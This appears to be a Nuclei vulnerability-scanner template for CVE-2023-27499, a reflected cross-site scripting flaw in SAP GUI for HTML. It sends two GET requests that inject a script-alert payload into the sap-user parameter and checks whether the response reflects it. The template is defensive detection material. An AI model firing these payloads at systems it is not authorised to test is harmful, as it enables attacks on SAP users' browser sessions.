id: CVE-2023-27499

info:
  name: SAP GUI for HTML Reflected XSS
  author: ProjectDiscoveryAI
  severity: medium
  description: SAP GUI for HTML - versions KERNEL 7.22, 7.53, 7.54, 7.77, 7.81, 7.85, 7.89, 7.91, KRNL64UC, 7.22, 7.22EXT, KRNL64UC 7.22, 7.22EXT does not sufficiently encode user-controlled inputs, resulting in a reflected Cross-Site Scripting (XSS) vulnerability.
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of the victim's browser.
  remediation: |
    Apply the latest security patches provided by SAP to mitigate the XSS vulnerability.
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/sap/bc/gui/sap/its/webgui?~transaction=*SU01&sap-user={{randstr}}<script>alert('XSS')</script>"
      - "{{BaseURL}}/sap/bc/gui/sap/its/webgui?~transaction=*SU01&sap-user=<script>alert('XSS')</script>{{randstr}}"

    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
